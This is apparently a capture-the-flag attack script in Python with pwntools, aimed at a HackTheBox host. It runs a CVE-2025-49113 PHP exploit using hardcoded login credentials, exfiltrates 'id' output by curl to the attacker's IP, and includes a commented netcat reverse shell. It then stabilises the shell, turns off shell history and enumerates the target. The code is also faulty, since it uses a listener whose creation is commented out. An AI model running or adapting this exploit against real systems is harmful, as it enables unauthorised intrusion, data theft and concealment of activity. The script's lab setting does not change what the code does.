from subprocess import run
from pwn import *

tun0_ip = net.interfaces4()[b'tun0'][0]
port = 1234

#l = listen(port)

#command = f'nc -e /bin/bash {tun0_ip} {port}'
command = f'curl http://{tun0_ip}:8000/$(id | base64 -w0)'
print(f'{command=}')
run(['php', 'CVE-2025-49113-exploit/CVE-2025-49113.php', 'http://mail.outbound.htb', 'tyler', 'LhKL1o9Nm3X2', f'"{command}"'])

print(l.read())

l.interactive()

l.readuntil('$')
l.sendline(b"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
l.sendline(" export SHELL=bash")
l.sendline(" export HISTFILE=/dev/null")
l.sendline(" export TERM=xterm")
l.sendline(" stty rows 38 columns 116")
l.sendline(""" alias ls='ls -lha --color=auto'""")
l.sendline("hostname")
l.sendline("whoami")
l.sendline("uname -a")
l.sendline("ps aux")
l.interactive()

